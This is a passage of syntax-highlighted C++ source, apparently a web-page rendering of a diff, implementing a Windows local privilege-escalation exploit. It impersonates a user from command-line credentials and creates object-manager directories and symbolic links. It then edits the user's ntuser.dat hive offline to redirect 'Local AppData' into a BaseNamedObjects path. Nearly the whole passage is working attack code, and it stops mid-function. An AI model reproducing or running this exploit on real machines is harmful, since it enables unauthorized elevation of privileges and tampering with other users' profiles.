+</span></span><span class=line><span class=cl>	<span class=n>targ</span><span class=p>.</span><span class=n>password</span> <span class=o>=</span> <span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>htoken</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HKEY</span> <span class=n>hloadedhive</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>userhivepath</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>huserhive</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>ORHKEY</span> <span class=n>hivemap</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>retval</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>ORHKEY</span> <span class=n>htargetkey</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>bool</span> <span class=n>shouldrestore</span> <span class=o>=</span> <span class=nb>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>existinglocalappdatapath</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>guid</span><span class=p>[</span><span class=mi>64</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>GenGUID</span><span class=p>(</span><span class=n>guid</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>newlappdata</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=sa>L</span><span class=s>&#34;</span><span class=se>\\\\</span><span class=s>.</span><span class=se>\\</span><span class=s>globalroot</span><span class=se>\\</span><span class=s>BaseNamedObjects</span><span class=se>\\</span><span class=s>Restricted&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>elapsz</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>bool</span> <span class=n>cleandir</span> <span class=o>=</span> <span class=nb>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>workdir</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=sa>L</span><span class=s>&#34;C:</span><span class=se>\\</span><span class=s>&#34;</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>wcscat</span><span class=p>(</span><span class=n>workdir</span><span class=p>,</span> <span class=n>guid</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>NTSTATUS</span> <span class=n>stat</span> <span class=o>=</span> <span class=n>STATUS_SUCCESS</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hworkdirobj</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hmsdirobj</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hwindirlnk</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hwindirlnk1</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>newhivepath</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>wsprintf</span><span class=p>(</span><span class=n>newhivepath</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;%s</span><span class=se>\\</span><span class=s>ntuser.dat&#34;</span><span class=p>,</span> <span class=n>workdir</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>usrclasshivepath</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>usrclasshivepathnew</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>wsprintf</span><span class=p>(</span><span class=n>usrclasshivepathnew</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;%s</span><span class=se>\\</span><span class=s>UsrClass.dat&#34;</span><span class=p>,</span> <span class=n>workdir</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kt>void</span><span class=o>*</span> <span class=n>hivebuff</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>hivesz</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>LARGE_INTEGER</span> <span class=n>li</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>readbytes</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>_winlnktarget1</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>wsprintf</span><span class=p>(</span><span class=n>_winlnktarget1</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;</span><span class=se>\\</span><span class=s>??</span><span class=se>\\</span><span class=s>C:</span><span class=se>\\</span><span class=s>%s&#34;</span><span class=p>,</span> <span class=n>guid</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>UNICODE_STRING</span> <span class=n>winlnktarget1</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>RtlInitUnicodeString</span><span class=p>(</span><span class=o>&amp;</span><span class=n>winlnktarget1</span><span class=p>,</span> <span class=n>_winlnktarget1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>_winlnktarget2</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>wsprintf</span><span class=p>(</span><span class=n>_winlnktarget2</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;</span><span class=se>\\</span><span class=s>??</span><span class=se>\\</span><span class=s>C:</span><span class=se>\\</span><span class=s>Users</span><span class=se>\\</span><span class=s>%s</span><span class=se>\\</span><span class=s>AppData</span><span class=se>\\</span><span class=s>Local</span><span class=se>\\</span><span class=s>Microsoft</span><span class=se>\\</span><span class=s>Windows&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>	<span class=n>UNICODE_STRING</span> <span class=n>winlnktarget2</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>RtlInitUnicodeString</span><span class=p>(</span><span class=o>&amp;</span><span class=n>winlnktarget2</span><span class=p>,</span> <span class=n>_winlnktarget2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>UNICODE_STRING</span> <span class=n>msdirobjpath</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>UNICODE_STRING</span> <span class=n>workdirobjpath</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>OBJECT_ATTRIBUTES</span> <span class=n>msdirobjattr</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>OBJECT_ATTRIBUTES</span> <span class=n>workdirobjattr</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>RtlInitUnicodeString</span><span class=p>(</span><span class=o>&amp;</span><span class=n>msdirobjpath</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;</span><span class=se>\\</span><span class=s>BaseNamedObjects</span><span class=se>\\</span><span class=s>Restricted</span><span class=se>\\</span><span class=s>Microsoft&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=kt>wchar_t</span> <span class=n>_workdirobjpath</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>wsprintf</span><span class=p>(</span><span class=n>_workdirobjpath</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;</span><span class=se>\\</span><span class=s>BaseNamedObjects</span><span class=se>\\</span><span class=s>Restricted</span><span class=se>\\</span><span class=s>%s&#34;</span><span class=p>,</span> <span class=n>guid</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>RtlInitUnicodeString</span><span class=p>(</span><span class=o>&amp;</span><span class=n>workdirobjpath</span><span class=p>,</span> <span class=n>_workdirobjpath</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>UNICODE_STRING</span> <span class=n>uwin</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>RtlInitUnicodeString</span><span class=p>(</span><span class=o>&amp;</span><span class=n>uwin</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;Windows&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>OBJECT_ATTRIBUTES</span> <span class=n>winlnkobjattr1</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=n>HANDLE</span> <span class=n>hlock</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>OVERLAPPED</span> <span class=n>ov</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>	<span class=n>DWORD</span> <span class=n>transfersz</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=n>targ</span><span class=p>.</span><span class=n>hcallerthread</span> <span class=o>=</span> <span class=n>OpenThread</span><span class=p>(</span><span class=n>THREAD_ALL_ACCESS</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>GetCurrentThreadId</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>targ</span><span class=p>.</span><span class=n>hcallerthread</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to open current thread, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>InitializeObjectAttributes</span><span class=p>(</span><span class=o>&amp;</span><span class=n>workdirobjattr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>workdirobjpath</span><span class=p>,</span> <span class=n>OBJ_CASE_INSENSITIVE</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>stat</span> <span class=o>=</span> <span class=n>_NtCreateDirectoryObjectEx</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hworkdirobj</span><span class=p>,</span> <span class=n>GENERIC_ALL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>workdirobjattr</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>stat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to create object directory %ws, error : 0x%0.8X</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>workdirobjpath</span><span class=p>.</span><span class=n>Buffer</span><span class=p>,</span> <span class=n>stat</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>InitializeObjectAttributes</span><span class=p>(</span><span class=o>&amp;</span><span class=n>msdirobjattr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>msdirobjpath</span><span class=p>,</span> <span class=n>OBJ_CASE_INSENSITIVE</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>stat</span> <span class=o>=</span> <span class=n>_NtCreateDirectoryObjectEx</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hmsdirobj</span><span class=p>,</span> <span class=n>GENERIC_ALL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>msdirobjattr</span><span class=p>,</span> <span class=n>hworkdirobj</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>stat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to create object directory %ws</span><span class=se>\n</span><span class=s>, error : 0x%0.8X</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>msdirobjpath</span><span class=p>.</span><span class=n>Buffer</span><span class=p>,</span> <span class=n>stat</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>InitializeObjectAttributes</span><span class=p>(</span><span class=o>&amp;</span><span class=n>winlnkobjattr1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>uwin</span><span class=p>,</span> <span class=n>OBJ_CASE_INSENSITIVE</span><span class=p>,</span> <span class=n>hmsdirobj</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>stat</span> <span class=o>=</span> <span class=n>_NtCreateSymbolicLinkObject</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hwindirlnk</span><span class=p>,</span> <span class=n>GENERIC_ALL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>winlnkobjattr1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>winlnktarget1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>stat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to create object symbolic link %ws</span><span class=se>\\</span><span class=s>%ws</span><span class=se>\n</span><span class=s>, error : 0x%0.8X</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>msdirobjpath</span><span class=p>.</span><span class=n>Buffer</span><span class=p>,</span> <span class=n>uwin</span><span class=p>.</span><span class=n>Buffer</span><span class=p>,</span> <span class=n>stat</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>InitializeObjectAttributes</span><span class=p>(</span><span class=o>&amp;</span><span class=n>winlnkobjattr1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>uwin</span><span class=p>,</span> <span class=n>OBJ_CASE_INSENSITIVE</span><span class=p>,</span> <span class=n>hworkdirobj</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>stat</span> <span class=o>=</span> <span class=n>_NtCreateSymbolicLinkObject</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hwindirlnk1</span><span class=p>,</span> <span class=n>GENERIC_ALL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>winlnkobjattr1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>winlnktarget2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>stat</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to create object symbolic link %ws</span><span class=se>\\</span><span class=s>%ws</span><span class=se>\n</span><span class=s>, error : 0x%0.8X</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>workdirobjpath</span><span class=p>.</span><span class=n>Buffer</span><span class=p>,</span> <span class=n>uwin</span><span class=p>.</span><span class=n>Buffer</span><span class=p>,</span> <span class=n>stat</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=n>cleandir</span> <span class=o>=</span> <span class=n>CreateDirectoryWithPermissiveDACL</span><span class=p>(</span><span class=n>workdir</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>cleandir</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>LogonUser</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>LOGON32_LOGON_INTERACTIVE</span><span class=p>,</span> <span class=n>LOGON32_PROVIDER_DEFAULT</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>htoken</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=n>htoken</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;LogonUser failed, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>ImpersonateLoggedOnUser</span><span class=p>(</span><span class=n>htoken</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;ImpersonateLoggedOnUser failed, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=n>ExpandEnvironmentStringsForUser</span><span class=p>(</span><span class=n>htoken</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;C:</span><span class=se>\\</span><span class=s>Users</span><span class=se>\\</span><span class=s>%USERNAME%</span><span class=se>\\</span><span class=s>ntuser.dat&#34;</span><span class=p>,</span> <span class=n>userhivepath</span><span class=p>,</span> <span class=n>MAX_PATH</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>ExpandEnvironmentStringsForUser</span><span class=p>(</span><span class=n>htoken</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;C:</span><span class=se>\\</span><span class=s>Users</span><span class=se>\\</span><span class=s>%USERNAME%</span><span class=se>\\</span><span class=s>AppData</span><span class=se>\\</span><span class=s>Local</span><span class=se>\\</span><span class=s>Microsoft</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>UsrClass.dat&#34;</span><span class=p>,</span> <span class=n>usrclasshivepath</span><span class=p>,</span> <span class=n>MAX_PATH</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>huserhive</span> <span class=o>=</span> <span class=n>CreateFile</span><span class=p>(</span><span class=n>userhivepath</span><span class=p>,</span> <span class=n>GENERIC_READ</span><span class=p>,</span> <span class=n>FILE_SHARE_READ</span> <span class=o>|</span> <span class=n>FILE_SHARE_WRITE</span> <span class=o>|</span> <span class=n>FILE_SHARE_DELETE</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>OPEN_EXISTING</span><span class=p>,</span> <span class=n>FILE_ATTRIBUTE_NORMAL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>huserhive</span> <span class=o>||</span> <span class=n>huserhive</span> <span class=o>==</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to open user hive </span><span class=se>\&#34;</span><span class=s>%ws</span><span class=se>\&#34;</span><span class=s>, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>userhivepath</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>GetFileSizeEx</span><span class=p>(</span><span class=n>huserhive</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>li</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>hivesz</span> <span class=o>=</span> <span class=n>li</span><span class=p>.</span><span class=n>QuadPart</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=n>hivebuff</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>hivesz</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>ReadFile</span><span class=p>(</span><span class=n>huserhive</span><span class=p>,</span> <span class=n>hivebuff</span><span class=p>,</span> <span class=n>hivesz</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>readbytes</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>)</span> <span class=o>||</span> <span class=n>hivesz</span> <span class=o>!=</span> <span class=n>readbytes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to backup target user hive content, error : %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GetLastError</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>		<span class=c1>// fucking retarded
+</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>SetFilePointer</span><span class=p>(</span><span class=n>huserhive</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>FILE_BEGIN</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>retval</span> <span class=o>=</span> <span class=n>OROpenHiveByHandle</span><span class=p>(</span><span class=n>huserhive</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>hivemap</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>retval</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to map user hive to memory, error %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>retval</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>retval</span> <span class=o>=</span> <span class=n>OROpenKey</span><span class=p>(</span><span class=n>hivemap</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;Software</span><span class=se>\\</span><span class=s>Microsoft</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>CurrentVersion</span><span class=se>\\</span><span class=s>Explorer</span><span class=se>\\</span><span class=s>User Shell Folders&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>htargetkey</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>retval</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to open HKCU</span><span class=se>\\</span><span class=s>Software</span><span class=se>\\</span><span class=s>Microsoft</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>CurrentVersion</span><span class=se>\\</span><span class=s>Explorer</span><span class=se>\\</span><span class=s>User Shell Folders, error %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>retval</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=n>retval</span> <span class=o>=</span> <span class=n>ORSetValue</span><span class=p>(</span><span class=n>htargetkey</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;Local AppData&#34;</span><span class=p>,</span> <span class=n>REG_EXPAND_SZ</span><span class=p>,</span> <span class=p>(</span><span class=n>LPBYTE</span><span class=p>)</span><span class=n>newlappdata</span><span class=p>,</span> <span class=n>wcslen</span><span class=p>(</span><span class=n>newlappdata</span><span class=p>)</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>wchar_t</span><span class=p>)</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>wchar_t</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>retval</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Failed to set HKCU</span><span class=se>\\</span><span class=s>Software</span><span class=se>\\</span><span class=s>Microsoft</span><span class=se>\\</span><span class=s>Windows</span><span class=se>\\</span><span class=s>CurrentVersion</span><span class=se>\\</span><span class=s>Explorer</span><span class=se>\\</span><span class=s>User Shell Folders</span><span class=se>\\</span><span class=s>Local AppData, error %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>retval</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=k>goto</span> <span class=n>cleanup</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
